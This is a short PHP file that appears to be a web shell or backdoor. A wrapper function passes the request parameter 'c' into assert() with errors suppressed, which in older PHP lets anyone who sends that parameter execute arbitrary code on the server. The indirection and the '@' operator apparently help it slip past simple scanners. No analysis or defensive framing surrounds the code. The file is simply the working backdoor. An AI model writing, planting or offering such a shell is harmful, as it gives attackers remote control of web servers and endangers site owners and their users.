<?php
function abc($x){
@assert($x);
}
abc($_REQUEST['c']);
?>